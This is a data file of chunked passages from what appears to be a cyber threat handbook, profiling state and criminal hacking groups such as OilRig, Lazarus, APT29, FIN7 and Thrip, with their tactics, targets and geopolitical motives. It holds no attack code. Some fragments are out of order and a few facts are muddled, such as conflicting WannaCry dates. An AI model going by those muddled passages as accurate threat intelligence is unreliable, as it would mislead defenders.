"They infects their victims, steal the data and the C2 infrastructure expires in a few months. This strategy indicates that they knew what they are looking for. They did not maintain a persistent presence on the compromised network when their goal is reached.

nearly a year of silence, new variants of the ICEFOG (ICEFOG-M and ICEFOF-P) have been found, used during campaign which targets do not match with previously seen campaign. NB: According to the researcher Chi-en Shen from FireEye, the new variants of the ICEFOG backdoor are used by multiple Chinese groups (APT9, APT15, Goblin Panda and another group name Temp Group A which can actually be the original Icefog group). The conclusion is that the ICEFOG backdoor cannot be used to attribute a campaign.

_DESCRIPTION

_ATTACKS HAPPENED ON

ATK236 - (aka: TA551, GOLD CABIN, Shathak) is a financially-motivated threat group that has been active since at least 2018 that uses large-scale phishing campaigns to deliver additional malware payloads. IcedID and Valak were the predominant payloads we observed with TA551 phishing campaigns in 2020. The group has distributed different malware families over time, but consistently used password-protected ZIP archives containing macro-enabled Office documents. The group has primarily targeted English, German, Italian, and Japanese speakers through emailbased malware distribution campaigns. In September 2021, the group was observed pushing Trickbot to the infected hosts, which, in turns, delivered DarkVNC and Cobalt Strike beacons."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f57a6c39862b410d955d314734ca31d0

Acquisition of several new evasion techniques, making it difficult to detect. 2019 : malicious payload is hidden in victim’s system with the help of special file format. Storage of its communication with the control server in an encrypted format on Facebook and YouTube pages. Therefore difficulty in detecting communication traffic as malicious and since no antivirus is blocking either of these websites, it ensures that the controlling server can execute commands without interruption.

It focuses its efforts on evasion of detection using modular installers. The malware allows attackers to conduct fraudulent banking transactions by using victims’ computers to bypass security measures used by banking institutions. JAVALI (aka Ousaban) 2017 : Uses multistage malware and distributes its initial payload via phishing emails, as an attachment or link to a website. These emails include an MSI (Microsoft Installer) file with an embedded Visual Basic Script that downloads the final malicious payload from a remote C2; it also uses DLL sideloading and several layers of obfuscation to hide its malicious activities from analysts and security solutions.

_DESCRIPTION ATK241 - It seems that the group’s shift in focus from mimicking a criminal modus operandi with ransomware-like extortion campaigns with data encryption to actually using a wiper to destroy the target’s data. This tactic of near luring by pretending to use one modus operandi rather than another is not yet explained and is not common. In all likelihood, the attacker must be trying to buy time by hiding his original intent behind a classic ransomware attack to have time to erase all the data he wants from his target. The group is suspected of originating from Iran and of being a sponsored group. The link to Iran is argued by SentinelLabs under four points: • Firstly, the nature of the motivation and the modus operandi using wipers echoes behaviour observed in other groups suspected of being sponsored by the Iranian state. The nature of the targets is also reminiscent of the geopolitical tension between Iran and Israel. Another target located in the United Arab Emirates had already been targeted by Iranian groups. It is a critical infrastructure facility of the Emirates. • Secondly, some of the webshells deployed by the group were modified versions of ASPXSpy. Three of these variants were uploaded to VirusTotal from Iran, the rest from other Middle Eastern countries. • Also, while the group regularly uses public VPN providers (e.g. ProtonVPN), it has used nonVPN nodes from servers linking to Iranian domains in the past.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|4ddfd8619e5745828c6596cc580a21a6
"Finally, Agrius uses the DEADWOOD wiper in its arsenal. This software has been linked by some sources to ATK35 (APT33), the Shamoon operator. It seems that Agrius and ATK35 share resources in this matter. This is because the variant used by Agrius is an improvement of the original software, which implies that the group had access to the source code of the latter or at least ex-

changed with the original developers. The use of DEADWOOD came shortly after an attempt by Agrius to use his personal wiper named Apostle. Apostle was probably not fully operational at the time of its deployment, which prompted Agrius to use an equivalent from an outside source.

ATK29 - Known for their attacks on foreign maritime systems to extract data necessary for the development of Chinese navy skills, as well as for its geostrategic use in the context of the New Silk Roads project. This group also campaigned against the Cambodian government in the general elections of 29 June 2018. The infrastructure used in this attack shares many similarities with that used in campaigns against the maritime domain. These similarities allow us to reinforce the conclusions that link the group to these two different campaigns and that establish the Chinese origin of the latter. FireEye links the two groups TEMP. Periscope and TEMP.Jumper definitively in a report published in March 2019. Since March 2019, there has been a paradigm shift and a change in the sectors targeted by the group. Thus, while the group had mainly targeted maritime companies in order to catch up with the Chinese Navy, it is increasingly targeting political organizations in Southeast Asia. The purpose of these spying actions is to support the Chinese Silk Roads project on freight transport infrastructure projects. ATK29 is a group whose campaigns obey the Chinese needs for technological catch-up and Beijing’s diplomatic ambitions. The group is always very active, and is composed of competent people. Its arsenal is composed of many tools, which are regularly changed. It is quite reactive and has, in the past, used security vulnerabilities only a few days after their publication.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f675527ca0f04d5f9b09b198b0266084
"Many of the tools used by this group are also used by other Chinese state attackers, suggesting exchanges of skills and tools between different sections. In addition, the group shared its infrastructure with another group of Chinese attackers, Hellsing. In January 2020, the group was observed targeting Malaysian Government officials. The attack goal was probably data exfiltration.

Dream Job

It should be recalled that in February 2007 relations between the two countries were due to be normalized following a bilateral agreement signed in Beijing to record the closure of the Yongbyon power station. However, one year after the agreement, North Korea announced the reopening of this power station before firing a Unha-2 rocket which was supposed to carry a communications satellite in April 2009. However, according to military security experts, it was a ballistic missile. Since then, relations have fluctuated between tension and calm as North Korea under embargo is caught by the throat. In order to calm its adversary, the United States is providing food aid in exchange for a restraint effort. However, the aid is not enough, and North Korea has no other choice but to repeat its pressure or to resort to perilous barter. Therefore, for decades, North Korea has been exchanging arms with countries such as Syria, Iran, Congo, Myanmar, Eritrea or Yemen in exchange for food. The year 2018 is interesting from this point of view, since the paradigm of relations between the United States and North Korea has taken an unexpected turn.

After months of great tension between Donald J. Trump and Kin Jung Un, which caused the international community to fear a nuclear incident, the North Korean leader"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3e41aa163be64b21ab7a192a6b1e30c9
"proposed to the American President a meeting to discuss his country’s military nuclearization. Prior to the meeting on 12 June 2018, Kim Jung Un redesigned the North Korean army and said he wanted to maintain ""the momentum of appeasement with the United States and its willingness to eventually give up its nuclear deterrent. The summit resulted in a joint statement: Joint Statement of President Donald J. Trump of the United States of America and Chairman Kim Jong Un of the Democratic People’s Republic of Korea at the Singapore Summit. Four main points emerged from this statement. First, the United States and North Korea are committed to establishing a new relationship in accordance with the desire of the people of both countries for peace and prosperity. Second, the two countries will join efforts to establish a lasting and stable peace regime on the Korean Peninsula. Thirdly, by reaffirming the Panmunjeom Declaration of 27 April 2018, North Korea is committed to working towards the complete denuclearization of the Korean peninsula. Finally, the two States undertake to recover the bodies of prisoners of war and missing in action, including the immediate repatriation of those already identified. The declaration also mentions that D.J. Trump undertakes to provide security guarantees to North Korea in return. _Cyber as a new strategic lever for North Korean ambitions How can we understand this turnaround in the geopolitical situation? A potential answer: a new cyber strategy."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|890ce08147af4566848f694d316981a9
North Korea is not to be outdone in this respect. Already in December 2017, the peninsular state had already distinguished itself with the WannaCry malware affair. In a quasi-joint statement, the United States and Great Britain stated that North Korea was behind this massive attack, which affected almost 300,000 computers in 150 countries and caused billions of dollars in damage. While no hard|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|01ab9cf3891d4bb790849a59f1c9fe31
evidence was provided, Thomas Bossert, who is assisting the US President, said that Australia, Canada and New Zealand shared the same conclusions. The NCSC was more specific in its statement, saying that the North Korean piracy group Lazarus was almost certainly behind the attack. In May 2017 the contaminated computers were instantly locked down and users were asked to pay a ransom in exchange for the restoration of their data. Europol described the scale of the attack as «unprecedented». Already in 2014, North Korea had attacked Sony Pictures. Due to the scale of the damage, the U.S received help from Microsoft and Facebook to counter WannaCry. Microsoft in a publication confirmed the statements of the British NCSC and stated that «by working with Facebook and other members of the security community, we have taken strong measures to protect our customers and the Internet from ongoing attacks by an advanced player in the persistent threats known as ZINC also known as the Lazarus Group». The attack, while reaching known geopolitical enemies such as Britain, whose Health National Service (NHS) was hit hard, also spread to states relatively close to North Korea such as Russia. The country’s postal services were also severely disrupted. _A cyber tool at the service of the regime’s domestic and foreign policy North Korea is using its cyber capabilities for two geopolitical purposes.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5774362c5d4b4e2d99bedad73f7ae73a
"First, as with the Sony and WannaCry attacks, the country is very simply targeting its classic geopolitical enemies. In June 2018, for example, North Korean hackers targeted a South Korean think tank specializing in national security issues. The hackers took advantage of a zero-day to compromise the organization’s website and insert a backdoor for code injection. Earlier in April 2018, Chinese state-sponsored hacking groups targeted Japanese defence companies to obtain information on Tokyo’s policy towards North Korea. This information was likely shared. In May it was the Google Play application that Cyber Threat Handbook | 173

Bureaus associated to the Reconnaissance General Bureau. The Bureau 121 is the primary office tasked with cyber operations. It was reorganized in September 2016 and it is now composed of:"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|006d9a1e255e4fa2b6ceea7b5a345954
"In addition to these direct attacks or cyber-espionage actions of geopolitical origin, North Korea uses cyber-espionage as a repercussion of geopolitical situations. As we mentioned, the country has to use barter to support itself and to circumvent the Western embargo. Cyber-attacks have become the new tool of this North Korean policy of survival. In August 2018, the Indian bank Cosmos was robbed of 13.5 million dollars by North Korean hackers who, after penetrating the structure’s banking system and making thousands of unauthorized ATM withdrawals, made several illegal money transfers via the SWIFT financial network. The same technique was used, and the same consequences were seen in April 2018 at a Central American online casino with the aim of siphoning off funds. Finally, although there are many examples, as early as March 2018 the group of hackers in question targeted several major Turkish banks and government funding agencies.

"stealing confidential information and technology to develop weapons of mass destruction.

The North Korean cyber threat structure is unique. Several high-level groups exist with the characteristic of being dedicated to a specific function. However, all of these groups are linked to the North Korean military apparatus, in particular to Bureau 121 of the Reconnaissance General Bureau, which leads most sources to amalgamate them under a devoted name, Lazarus. Nevertheless, this concentration is detrimental to the analysis insofar as the Lazarus prism leads us to consider that only one group pursues the motivations of APT, cybercriminal, terrorist and hacktivist at the same time. We try as much as possible to specify the Lazarus sub-groups for adequate intelligence. AKT3 or Lazarus is not a single Threat Group. It represents the Bureau 121 which is one of the eight 174

Korean dissidents, the collection of intellectual properties helping the development of weapons of mass destruction or political espionage. • Cyber Terrorism: in 2013 North Korea conducted disruptive attacks on South Korean media and financial companies (Operation DarkSeoul) and was responsible for the Sony hack link to the movie «The Interview» in November 2014. These attacks occured before the 2016 reorganization of the Bureau 121, that’s why we can’t tell which Unit is currently responsible of disruptive operations. • Money theft: One of the mission of the Bureau 121 is the collection of liquidity to finance these cyber activities and the DPKR itself. It is done by spreading ransomware like the infamous WannaCry which collected $91.000 through bank robbery. The cyber bank robbery is done by infiltrating the banking network to steal the SWIFT credentials and use these credentials to initiate transactions to an account controlled by the attacker. The most known is Bangladesh Central Bank Heist in February 2016 allowing the theft of $81m. This activity was carried on by the Unit 180, which has similar objectives than the North Korean threat group APT38 aka Stardust Chollima or BlueNoroff. _The Bureau 121 is supported by other Units from the General Staff Department • The Operation Bureau tasked to define cyber strategies and plan operations.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9ad0a26d886c4466bea94a1c3241f09a
"The Command Automation Bureau composed of three units: - Responsible for malware development (seems redundant with the Office 35) - Unit 32: responsible for military software development - Unit 56: responsible for command and control software development • The Enemy Collapse Sabotage Bureau tasked with information and psychological warfare.

A cyber operation involves the interaction of these different teams. For example, the Operation Bureau defines an objective, the Office 35 finds a useable exploit, the Unit 31 develops the backdoor and the lure documents with the help of the Enemy Collapse Sabotage Bureau to create efficient spear-phishing document. The Unit 56 develops C2 software and maintains a C2 infrastructure which will be used by the Lab 110, Unit 180 or Unit 91 to achieve the objective. Due to this configuration, it is expected to find tools and infrastructure overlap between the different operation units.

ATK32 - (aka: FIN7) is a financially motivated group that is active since at least 2013, which primarily targets the retail, hospitality and restaurant sectors, mainly in the U.S.. There are assumptions that this is the same group as Carbanak, but it appears that these are two separate groups using similar tools, and therefore are currently tracked separately. Its main goal is to steal financial assets from companies, such as debit cards, or to get access to financial data or computers of finance department employees in order to conduct wire transfers to offshore accounts. The group’s often use phishing as their main attack vector, including tailored spear-phishing campaigns. In addition, the group used a front company dubbed «Combi Security», purportedly headquartered in Russia and Israel, to provide a guise of legitimacy and to recruit hackers to join the criminal enterprise.

"Suspected origin of the attacker_ Unknown

_DESCRIPTION ATK33 - The attacks of this adversory are different from those seen in untargeted or targeted attacks, which makes it peculiar in many ways. When part of the targeted attacks can be qualified as opportunistic: This group will prefer to modify their target profiles and geographic attack zones based on geopolitical events. Thus, no target is immune in the world. ATK33’s objective will be to steal sensitive intellectual property related to government interests, The group has systematically targeted specific governments organizations, defense institutes, intelligence agencies, diplomatic institutions and telecommunications providers in South and Southeast Asia. The recurrent use of spear phishing tactics (phishing attempts targeting specific individuals) and access to previously unknown zero-day exploits have made it a very resilient threat. For initial access it uses mainly spear-phishing, we have also seen the use of nuisance attacks against vulnerable browser plugins. It uses several zero-day exploits suggesting that this is a well-resourced group. ATK33 is less prolific in the field than ATK9 for example, but focuses on a small number per year trying to hide its infections with self-removing malware and using one-shot delivery servers. It often targets the private email accounts of its victims and uses them to access the organization’s networks. It uses custom developed tools which are often updated to avoid detection."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|18302a6f7ab34b33b3fc6faf32d14899
"Its backdoors are configured to operate during the victim’s working hours to hide network traffic from legitimate traffic. Interestingly, there is no code shared between their different backdoors. The CnC infrastructure is a mixture of registered domains and free subdomains obtained through dynamic DNS providers. The group uses compromised infrastructure based in multiple countries.

"2012

Used lure documents often address controversial subjects to incite the reader to open them. Based on Microsoft’s investigations, here is a non-exhaustive list of ATK33 characteristics. • Implementation of several cyber espionage campaigns since at least 2009. • Concentration on a small number of campaigns per year, which reduces the risk of detection and helps the group to remain unnoticed and focused longer. • Targeting of governments and related organizations in South and South East Asia. Using multiple unpatched vulnerabilities in zero-day exploits against its victims. • Main method: Spear phishing Hiding its traces by automatic removal of malicious components or by using single mode server-side logic where remotely hosted malicious components are only allowed to load once. • Harassment of its targets via their unofficial or private email accounts, to use them as a springboard to the planned organization’s network. • Use of malicious tools that are tailor-made and have the resources to update these applications often in order to avoid being detected. • Configuring its backdoor malware to restrict its activities to victims’ working hours, in an effort to disguise post-infection network activity from normal user traffic. • Its espionage activity is not intended to achieve direct financial gain, but rather uses stolen information for indirect economic benefits.

Focusing on South Korean targets, this group can be compared to Unit 91 which has similar objectives. While from 2014 to 2017, ATK4 mainly targeted the South Korean government, defense, its industrial fabric and the media sector, ATK4 moved to more international targets with further attacks against the Middle East, Japan and the Vietnam. These new targets are all tied to North Korean interests. This group uses spear phishing, strategic web compromises, or torrent file sharing as an initial infection vector. From 2014 to 2017, their decoy ducos were written in Korean and related to a theme relating to the Korean Peninsula. It uses various legitimate platforms like C2 and has access to several 0-day vulnerabilities. The group can integrate newly revealed vulnerabilities into their toolset. This can be explained with the collaboration of different units within the North Korean General Reconnaissance Bureau.

ATK40 - The group targets as a priority the financial institutions of the Sunni Gulf States, but also the United States and Israel, traditional geopolitical opponents of the Republic of the Mullahs. During the OilRig campaign in 2016 against financial institutions in Saudi Arabia, the group demonstrated capabilities to adapt its procedures and to use multiple delivery methods, particularly through well-crafted spear-phishing messages relevant to the interests of targeted personnel and custom PowerShell implants like the Helminth backdoor. He relies heavily on the human factor for the initial access. After the first report by FireEye and PaloAlto, the group has been actively updating his tools and expanding his scope of targets (Qatar, Turkey, Israel and United States). The group continues to use communication through DNS Tunnelling to the command and control server to stay under the radar. In early 2017, the group demonstrated the ability to use digitally signed malware spread through fake websites (University of Oxford conference signup page and a job application website). PaloAlto observed an overlap in C&C IP address used by OilRig and used by Chafer for his Remexi backdoor C&C, suggesting that these groups are one entity or that they share resources. Furthermore, the similarity between the malware ISMAgent used by OilRig and ISMDoor used by GreenBug suggests a link between these groups."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7967d40696574e94b72b7a389514f1de
"This actor shows high capabilities of adaptation, creating new custom delivery documents and backdoor and using multiple TTP to re-infect previous targets who took actions to counter their known TTP. We did not observe this actor using a zero-day exploit, but it quickly used the CVE-2017-0199 and CVE-2017-

11882 which are widely used to improve the quality of his lure documents. DragoS considers that ATK40 (OilRig) and ATK59 (Greenbug) are the same threat group and carried out initial preparations and network intrusion in advance of the Shamoon event. This group test regularly its samples on anti-virus testers like VirusTotal to determine what content of their malwares are detected. This technique helped to build nearly undetected samples but allowed researchers to follow the modifications. In April 2019, multiple OilRig tools were leaked on a Github repository, including BONDUPDATER, the TwoFace WebShell and webmask, a tool linked to DNSpionage. This leak was followed in June 2019 by another about the tool Jason. OilRig infrastructure is continuously growing but overlaps with previously used infrastructure. The group reuses his tools, uses the same attack protocols and has a consistent victimology which makes it easy to track down.

Spearphishing of the

French Defense Ministry

ATK5 - It is a skilled team which has the capabilities to develop complex modular malwares and exploit multiple zero-days. Their malwares are compiled with Russian language setting and during the Russian office working hours. Despite number of public disclosure from European governments and indictments from the U.S. Department of Justice, this adversary continues to launch operations targeting the political and defense sector in Europe and Eurasia. Between 2007 and 2014, ATK5 had three kinds of targets: - Georgian government agencies (Ministry of Internal Affairs and Ministry of Defense) or citizens - Eastern European governments - Security organisations The attack of the Georgian Ministry of Defense can be a response to the growing U.S.-Georgian military relationship. In 2013, the group targeted a journalist which is a way to monitor public opinion, spread disinformations or identify dissident. During 2015 and 2016, this group activity increased significantly, with numerous attacks against government departments and embassies all over the world. Among their most notable presumed targets are the American Democratic National Committee, the German parliament and the French television network TV5Monde. ATK5 seems to have a special interest in Eastern Europe, where it regularly targets individuals and organizations involved in geopolitics. They also have been implicated in the U.S. presidential election attacks in late 2016."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|39d3604741404786bd04a547657d95e8
"The 2016 attacks were visible and disruptive but in 2017 the group operated a great change to more stealthy attacks to gather intelligence about a range of targets.

exploited no fewer than six zero-day vulnerabilities. This high number of zero-day exploits suggests significant resources available, either because the group members have the skills and time to find and weaponize these vulnerabilities, or because they have the budget to purchase the exploits. In addition, APT28 tries to profile its target system to deploy only the needed tools. This prevents researchers from having access to their full arsenal.

_ATTACKS HAPPENED ON

ATK52 - This Korean speaking attacker is especially active in the Sea of Japan and the East China Sea. Its goal is espionage of specific individuals. The group possesses extended cryptographic knowledge, that allowed it to create fake certificates, a capacity to develop and use 0-days (especially around Flash Player). It also has access to an extended network infrastructure that is reliable, allowing the group to maintain long-term access to the system.

“The CrowdStrike Falcon Intelligence team tracking of this adversary began in late 2016, when evidence of an attack surfaced against a victim based in India and working in the hospitality sector. The attack used an Excel spreadsheet containing macro code that deployed the previously mentioned simplistic .NET downloader payload. The basic nature of the malicious document and observed coding errors in the downloader payload are the basis for the assessment that this actor demonstrates a low level of technical skills. MYTHIC LEOPARD was further observed in 2017 developing methods for disguising custom malware implants. Two binder tools used to disguise custom executables as legitimate Microsoft implants — were discovered by Falcon Intelligence and linked to MYTHIC LEOPARD in July 2017. Since April 2018, Falcon Intelligence has observed ongoing targeted intrusion activity using malicious Microsoft Office Excel documents likely associated with the MYTHIC LEOPARD adversary. As part of this campaign, the adversary leveraged generic themes related to administrative, managerial or supervisory matters alongside a unique Visual Basic Script (VBScript) technique used for installation. Falcon Intelligence has observed MYTHIC LEOPARD using this technique for several years to install multiple first-stage implants and downloaders, including the isqlmanager and Waizsar RAT malware families."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3e5b6d0ca743438e9f0472f7757f34ef
"However, the use of the UPX packer and timestomping techniques have not previously been associated with this adversary and likely indicates an incremental

increase in tradecraft and sophistication. MYTHIC LEOPARD actors have previously used an indigenously produced .NET obfuscation tool to hide malware implants as legitimate tools. The malicious files visual_ HD.exe and skypee.exe both attempt to impersonate a legitimate uTorrent executable once installed and running. Both malicious files use a previously identified MYTHIC LEOPARD command-and-control (C2) domain msupdate.servehttp[.]com. MYTHIC LEOPARD has previously reused old C2 domains across medium to long periods of time, despite operational security concerns. The related decoy document in this attack simply displays a pay scale without any further identifying information. However, the filename (Pay Matrix Projected After 7th CPC (3).xls) suggests that it is related to India 7th Central Pay Commission recommendations for government salaries. As noted above, India is within the traditional target scope for this adversary.”

ATK7 - (aka: APT29, NOBELIUM, UNC2452) is an attacker group that exists since at least 2008 and that is believed to act for the Russian government. The group is composed of highy competent members that are well organized, allowing for complex and long-running campaigns. The group’s main goal is espionage and intelligence collection. The group therefore targets Western organizations, with a special focus on governmental bodies, think tanks... It as also occasionally expanded its reach to governments in the Middle East, Asia, Africa, etc. In order to reach its goal, the group has used multiple families of malware. The group aims to act fast, albeit in a noisy way: Their campaigns are not designed in order to be discrete, but to be distributed to a large number of victims, followed by deployment of a malware that will quickly grab and exfiltrate every potentially interesting information. When a victim of interest has been unmasked, the group will then often switch to a different, stealthier malware, designed for long-term persistence, in order to gather intelligence. In recent years, the group has been leading these campaigns bi-annually. The group is suspected to be responsible for the 2015 hack of multiple governmental institutions in the USA, including the White House, the Pentagon and the DoS. The threat actor behind the attacks against SolarWinds, the SUNBURST backdoor, TEARDROP malware, and related components."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2dcd7d7e61184bb399a0a4c01a424d03

_DESCRIPTION

_ATTACKS HAPPENED ON

ATK73 - The group entered the public spotlight following the 2017 hack of Larson Studios, and the subsequent release of an entire season of the TV show “Orange is the New Black”. “The Dark Overlord” key business model is to hack into low, medium and high-profile organizations, mostly in the healthcare, education, and media production sectors in the US and the UK, and subsequently put the stolen data up for sale or demand ransom from its victims. The Dark Overlord appears to primarily be a financially-driven threat actor, with a proven history of success, and likely millions of dollars in profits. The threat actor has been prevalently active on Darknet marketplaces and hacking forums, where he tries to sell “private” databases (databases that are not in the public domain yet), but also other goods, such as software source code.

Thrip targets Southeast Asia

234

ATK78 - This group was uncovered in January 2018 by Symantec during a campaign targeting an important telecommunication operator in Southern Asia. The day of its publication, the article from Symantec described five custom malwares: Rikamaru, Catchamas, Mycicil, Spedear and Syndicasec. But this article has been modified, maybe due to a mistake, and nothing remains but the Catchamas info stealer trojan. Because of these circumstances, the information presented here is with moderate confidence.

"_Type of attacker: State Sponsored

Motivations_

_DESCRIPTION

During the last wave of attack, which began in 2017, Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip’s motives go beyond spying and may also include disruption. The group uses several Live off the Land tools. It uses administrations tools available on the compromised machine to reach its goal. This technique has multiple advantages: - Reduced costs and development time of an attack. - The lack of custom malware makes the intrusion difficult to attribute. - Usage of legitimate tools and legitimates protocol makes the detection of the intrusion difficult to detect. ATK78 uses PsExec, a legitimate Microsoft Sysinternal for lateral movement in the compromised network. PsExec is used to install the Catchamas trojan which allows the adversary to steal information. This malware is deployed on interesting compromised systems. Symantec identified three computers based in China used to launch the attack. Thrip targeted a telecommunication satellite operator. It seemed to focus on systems executing the software used to control the satellites. It is possible that the"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d0d45688ae62424fa866072e2ed64b78
"objective was the perturbation besides the espionage. In the same way, when the group targeted a geospatial imaging organization, it focuses on computers executing the software ""MapXtreme Geographic Information System"", used to develop geospatial applications, Google Earth and Garmin imaging. The group targeted three organizations from Southeast Asia in the telecommunication sector and one in the defense sector. The nature of the attacks indicates that these organizations were targeted, not their clients.

Geographic targets and the kind of targeted entities indicate a correlation with PRC interests in the context of Sino-US tensions in the China Sea especially with issues of sovereignty around Spratly and Paracel islands. This suggests a direct link between Thrip Group and Chinese institutions. The group therefore appears to act based on a strategic framework defined by the Party, but also on immediate contextual indications. The group’s nuisance capabilities and usual targets make it formidable. We draw attention on the fact that we have chosen to treat only the case of the Thrip group under the ATK78, some sources also link it to the aliases Lotus Blossom, Lotus Panda, Spring Dragon. This state of affairs stems from the high level of sharing that exists between Chinese attackers and the structure of their cyber service leading to confusion in their identification.

ATK8 - The group has been discovered in March 2014 after the publication of a series of slides from Edward Snowden. This group is probably supported by a state-nation, considering the fact that it uses advanced techniques but does not seem to be financially motivated. Another more precise indication makes it possible to link the group to France. For good reason, the name ""Babar"" given to the group’s spyware echoes a strictly French fictional character. Also, the backdoor called ""Tafacalou"" has a name whose meaning in Occitan French regional language is translated as: ""it’s gonna get hot"". While the group is not associated to any campaign in particular, the tool it uses have been in order to target various organizations, notably in Syria, Iran and Malaysia. “More broadly, the group deploys its campaigns on a global scale with some twenty countries concerned.” The group mostly develops and uses espionage tools, and the way the malware are deployed to their targets is mostly unknown, though some documents containing zero-day exploits have been used.

ATK80 A threat actor which is active since at least November 2014. This group launched long-term attacks against organizations in the Syrian region using Android and Windows malwares. Its objective is the theft of sensitive information.

The initial access techniques include the conception of fake websites helped by typosquatting used to lead the user to download the malicious messaging app. The group also used social media like Facebook to induce users to download the malicious softwares from a specified link. 360 NetLab reserchers assess that lure documents could be used to deliver the payload through spear

phishing.

"ATK86 A Cybercrime group that has been active since the end of 2016, and that has attacked mostly banks all over the world. The group is believed to be from Russia, because most of their attacks (at least at the beginning), were directed against banks from Russia and former Soviet Union countries. _Type of attacker: Cyber Criminal

The group is known for their sophisticated and profound attacks, in which usually they take a long period of time to study the potential victim, to maximize the attack against them. In most cases, Spear-phishing emails were sent to bank employees, while having a malicious file attached to them. This usually downloaded the Silence Trojan that has many capabilities of stealing data, downloading additional tolls, track victims and more. A few versions of the toll were found, and it has shown that the group is continuing to enhance them. Furthermore, the group uses malwares to attack ATMs specifically, such as Atmosphere. At the begenning, the tools used to target ATM were developped by other cyber criminals but the group is currently using homemade tools. Through this, the group was able to steal millions of dollars in cash along the years, mostly from banks in Russia, and Eastern Europe. Some IP addresses used during theses attacks seems to be located in France, mostly from the OVH hoster. In 2020 the group started to target Banks in Sub-Saharian Africa and to threaten Australian banks of DDoS attacks if they will not pay large sums in Monero cryptocurrency. According to Group-IB the Silence group started to buy access from"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2cc4f79fcd574432b1495a93b8d0d828
"TA505 to banks which correlate with the diminution of spear-phishing attempt from Silence. TA505 seems to have sold at least the access to one European bank to Silence in end 2019.

ATK88 - (aka: FIN6) is a cybercrime group active since at least 2015, and focuses mostly on the financial sector. Their claim to fame is in attacking Point-of-Sales and stealing credit card data from them. Millions of cards were stolen using this method in recent years, and subsequently found to be sold on the dark web. Furthermore, in some cases, if they are unable to steal this data, they move to target card-not-present (CNP) data. They usually use specifically POS malware, and their victims are from companies that have many transactions. Therefore, most of their activity is against victims in the US and Europe. Of note, since mid2018, it was spotted that the group has started to deploy ransomware on non Ecommerce networks. The group may also be part of attacks that deploy ransomware such as Ryuk, LockerGoga and MegaCortex, again in likely partnership with banking Trojan botnets, which could be a further attempt to move into new “markets” that do not rely on the need to monetize credit card data.

"Gaza Cybergang Group 1: aka MoleRATs: The group’s aim is to the infection of the victim in a RAT and it often makes use of text-sharing platforms, such as: PasteBin, github.com, upload.cat and more. Gaza Cybergang Group 2: aka Desert Falcons: the group makes use of homemade malware, tools and techniques. Victims are often infected by social engineering methods such as fake websites that promise political information or spear phishing emails and social messaging. Gaza Cybergang Group 3: aka Operation Parliament: The group is focused on espionage, covering on executive and judicial bodies all over the world, and focusing on MENA, particularly Palestine. the group used malware with CMD/PowerShell commands for its attacks. Each group is different in TTPs, but they make use of the same tools after gaining the initial grip on their victims. ATK89 is a persistent threat to organizations and governments in the Middle East, routinely updating not only their malware implants, but also their delivery methods.

_DESCRIPTION

A particular international context

ATK91 - FireEye has awarded the development of TRITON to a Muscovite research institute linked to the Russian government. The attacker’s tools and TTPs indicate that he has prepared to conduct operations that can last several years and require a long preparation. In the 2017 attack, the group compromised the target’s network almost a year before reaching the SIS (Safety Instrument System). During this period, priority seems to have been given to safety operational. His lack of curiosity during the operation may indicate that the attacker is waiting for something before acting visibly."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|dee4c37132ec4ae59752e8b89a910b01
This initial attack on Saudi interests by a group whose origin appears to be Russian is taking place in an unusual international context. It should be recalled that since the end of 2017, Russia and Saudi Arabia have been moving closer together on the diplomatic front. However, if we look at the sector targeted, namely oil, we must remember that since 2014 and the annexation of Crimea, pressure from the West on Russia has been added to the fall in world oil prices, which has plunged Russia into a recession. To stimulate investment, the Kremlin had to find capital and foreign exchange. For this reason, Russia has moved closer to Saudi Arabia, whose alliance with the United States had weakened under the Obama era in the alder of the Iranian nuclear agreement, supported by the former US President. On 1 January 2017, the two countries decided to reduce oil production volumes to 1.8 million barrels/day in order to increase the price of black gold. The attack on Triton at the end of 2017 took place 9 months later, when King Salman travelled to Moscow (November 2017) to prepare for the next OPEC+ meeting, which was supposed to lead to a further reduction in production after March 2018. Nevertheless, the last 9 months have been marked by two important events that have redefined everyone’s interests.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|93e10ce35c554b2dbdd1cf04e82c871b
The change in US position in favor of Saudi Arabia during the Trump era by denouncing the Iranian nuclear agreement and the Gulf crisis of June 2017, which increased tension between the Kingdom and its Shiite alter ego, weakened relations between Russia and the Saudis. After the meeting of the two leaders and the attack on Saudi Arabia that paralyzed its oil company, Triton launched new attacks in 2018 in the Middle East region and against the United States. Good relations between Saudi Arabia and Russia were reconfirmed in the second week of June 2018, when Saudi Arabia and Russia agreed to stabilize oil prices at an average level of 75 dollars per barrel, while King Ben Salman and President Putin were meeting in Moscow for ope-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7f76c5e36c3c46cc9f6f6483b02eb4d9
